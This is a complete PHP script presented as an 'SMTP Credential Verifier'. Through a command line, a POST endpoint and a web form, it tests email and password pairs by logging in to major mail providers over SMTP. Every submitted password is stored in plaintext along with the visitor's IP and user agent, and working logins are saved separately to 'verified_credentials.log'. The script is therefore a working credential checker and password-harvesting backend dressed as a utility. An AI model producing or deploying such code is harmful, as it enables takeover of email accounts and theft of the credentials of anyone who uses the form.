<?php
/**
 * SMTP Email Verification Utility
 * This script verifies email credentials by attempting SMTP authentication
 */

class SMTPVerifier {
    private $timeout = 10;
    private $debug = false;
    
    // Common email provider configurations
    private $providers = [
        'gmail.com' => [
            'smtp' => 'smtp.gmail.com',
            'ports' => [587, 465],
            'tls' => true
        ],
        'outlook.com' => [
            'smtp' => 'smtp-mail.outlook.com', 
            'ports' => [587],
            'tls' => true
        ],
        'hotmail.com' => [
            'smtp' => 'smtp-mail.outlook.com',
            'ports' => [587],
            'tls' => true
        ],
        'yahoo.com' => [
            'smtp' => 'smtp.mail.yahoo.com',
            'ports' => [587, 465],
            'tls' => true
        ],
        'aol.com' => [
            'smtp' => 'smtp.aol.com',
            'ports' => [587],
            'tls' => true
        ],
        'icloud.com' => [
            'smtp' => 'smtp.mail.me.com',
            'ports' => [587],
            'tls' => true
        ]
    ];
    
    public function __construct($timeout = 10, $debug = false) {
        $this->timeout = $timeout;
        $this->debug = $debug;
    }
    
    /**
     * Verify email credentials
     */
    public function verifyCredentials($email, $password) {
        $domain = $this->getDomainFromEmail($email);
        if (!$domain) {
            return ['success' => false, 'error' => 'Invalid email format'];
        }
        
        // Try known provider configuration first
        if (isset($this->providers[$domain])) {
            $provider = $this->providers[$domain];
            foreach ($provider['ports'] as $port) {
                $result = $this->testSMTPConnection(
                    $provider['smtp'], 
                    $port, 
                    $email, 
                    $password, 
                    $provider['tls']
                );
                if ($result['success']) {
                    return $result;
                }
            }
        }
        
        // Try MX record lookup for other domains
        return $this->verifyWithMXRecords($email, $password);
    }
    
    /**
     * Verify using MX records
     */
    private function verifyWithMXRecords($email, $password) {
        $domain = $this->getDomainFromEmail($email);
        $mx_records = [];
        
        if (!getmxrr($domain, $mx_records)) {
            $mx_records = [$domain];
        }
        
        $common_ports = [587, 25, 465, 143, 993, 995];
        
        foreach ($mx_records as $mx_host) {
            foreach ($common_ports as $port) {
                $result = $this->testSMTPConnection($mx_host, $port, $email, $password);
                if ($result['success']) {
                    return $result;
                }
            }
        }
        
        return ['success' => false, 'error' => 'Could not verify credentials'];
    }
    
    /**
     * Test SMTP connection and authentication
     */
    private function testSMTPConnection($host, $port, $email, $password, $tls = null) {
        $result = ['success' => false, 'host' => $host, 'port' => $port];
        
        $socket = @fsockopen($host, $port, $errno, $errstr, $this->timeout);
        if (!$socket) {
            $result['error'] = "Connection failed: $errstr ($errno)";
            return $result;
        }
        
        $response = $this->readResponse($socket);
        if (!$this->checkResponse($response, '220')) {
            $result['error'] = "Invalid server response: $response";
            fclose($socket);
            return $result;
        }
        
        // Send EHLO
        $this->sendCommand($socket, "EHLO " . gethostname());
        $response = $this->readResponse($socket);
        
        // Handle TLS/STARTTLS
        if ($port == 587 || $tls) {
            $this->sendCommand($socket, "STARTTLS");
            $response = $this->readResponse($socket);
            if ($this->checkResponse($response, '220')) {
                if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
                    $result['error'] = "TLS negotiation failed";
                    fclose($socket);
                    return $result;
                }
                // Send EHLO again after TLS
                $this->sendCommand($socket, "EHLO " . gethostname());
                $this->readResponse($socket);
            }
        }
        
        // Attempt authentication
        $auth_result = $this->authenticateUser($socket, $email, $password);
        fclose($socket);
        
        return array_merge($result, $auth_result);
    }
    
    /**
     * Authenticate user with SMTP server
     */
    private function authenticateUser($socket, $email, $password) {
        // Try AUTH LOGIN
        $this->sendCommand($socket, "AUTH LOGIN");
        $response = $this->readResponse($socket);
        
        if (!$this->checkResponse($response, '334')) {
            return ['success' => false, 'error' => 'AUTH LOGIN not supported'];
        }
        
        // Send username
        $this->sendCommand($socket, base64_encode($email));
        $response = $this->readResponse($socket);
        
        if (!$this->checkResponse($response, '334')) {
            return ['success' => false, 'error' => 'Username rejected'];
        }
        
        // Send password
        $this->sendCommand($socket, base64_encode($password));
        $response = $this->readResponse($socket);
        
        if ($this->checkResponse($response, '235')) {
            return ['success' => true, 'message' => 'Authentication successful'];
        } else {
            return ['success' => false, 'error' => 'Authentication failed'];
        }
    }
    
    /**
     * Send command to SMTP server
     */
    private function sendCommand($socket, $command) {
        if ($this->debug) {
            echo ">> $command\n";
        }
        fputs($socket, $command . "\r\n");
    }
    
    /**
     * Read response from SMTP server
     */
    private function readResponse($socket) {
        $response = '';
        while ($line = fgets($socket, 256)) {
            $response .= $line;
            if (substr($line, 3, 1) == ' ') break;
        }
        
        if ($this->debug) {
            echo "<< $response";
        }
        
        return trim($response);
    }
    
    /**
     * Check if response starts with expected code
     */
    private function checkResponse($response, $expected) {
        return substr($response, 0, 3) == $expected;
    }
    
    /**
     * Extract domain from email address
     */
    private function getDomainFromEmail($email) {
        $parts = explode('@', $email);
        return count($parts) > 1 ? $parts[1] : null;
    }
    
    /**
     * Log verification attempt
     */
    public function logVerification($email, $password, $result) {
        $log_dir = 'verification_logs';
        if (!file_exists($log_dir)) {
            mkdir($log_dir, 0755, true);
        }
        
        $log_entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'email' => $email,
            'password' => $password,
            'result' => $result,
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
        ];
        
        $log_file = $log_dir . '/verification_' . date('Y-m-d') . '.log';
        file_put_contents($log_file, json_encode($log_entry) . "\n", FILE_APPEND | LOCK_EX);
        
        // Log successful verifications separately
        if ($result['success']) {
            $verified_file = $log_dir . '/verified_credentials.log';
            file_put_contents($verified_file, json_encode($log_entry) . "\n", FILE_APPEND | LOCK_EX);
        }
    }
}

// Usage example and CLI interface
if (php_sapi_name() === 'cli') {
    // Command line usage
    if ($argc < 3) {
        echo "Usage: php smtp_verifier.php <email> <password> [debug]\n";
        exit(1);
    }
    
    $email = $argv[1];
    $password = $argv[2];
    $debug = isset($argv[3]) && $argv[3] === 'debug';
    
    $verifier = new SMTPVerifier(10, $debug);
    $result = $verifier->verifyCredentials($email, $password);
    $verifier->logVerification($email, $password, $result);
    
    if ($result['success']) {
        echo "✓ Credentials verified successfully!\n";
        echo "Host: {$result['host']}:{$result['port']}\n";
    } else {
        echo "✗ Verification failed: {$result['error']}\n";
    }
    
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Web interface usage
    header('Content-Type: application/json');
    
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (empty($email) || empty($password)) {
        echo json_encode(['success' => false, 'error' => 'Email and password required']);
        exit;
    }
    
    $verifier = new SMTPVerifier();
    $result = $verifier->verifyCredentials($email, $password);
    $verifier->logVerification($email, $password, $result);
    
    echo json_encode($result);
    
} else {
    // Web form interface
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>SMTP Credential Verifier</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; }
            .form-group { margin-bottom: 15px; }
            label { display: block; margin-bottom: 5px; font-weight: bold; }
            input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
            button { background: #007cba; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; }
            button:hover { background: #005a87; }
            .result { margin-top: 20px; padding: 10px; border-radius: 4px; }
            .success { background: #d4edda; color: #155724; }
            .error { background: #f8d7da; color: #721c24; }
        </style>
    </head>
    <body>
        <h1>SMTP Credential Verifier</h1>
        <form id="verifyForm">
            <div class="form-group">
                <label>Email Address:</label>
                <input type="email" name="email" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Verify Credentials</button>
        </form>
        
        <div id="result"></div>
        
        <script>
            document.getElementById('verifyForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const formData = new FormData(this);
                const resultDiv = document.getElementById('result');
                
                resultDiv.innerHTML = 'Verifying...';
                
                fetch('', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    const className = data.success ? 'success' : 'error';
                    const message = data.success ? 
                        `✓ Credentials verified! (${data.host}:${data.port})` : 
                        `✗ Verification failed: ${data.error}`;
                    
                    resultDiv.innerHTML = `<div class="result ${className}">${message}</div>`;
                })
                .catch(error => {
                    resultDiv.innerHTML = `<div class="result error">Error: ${error.message}</div>`;
                });
            });
        </script>
    </body>
    </html>
    <?php
}
?>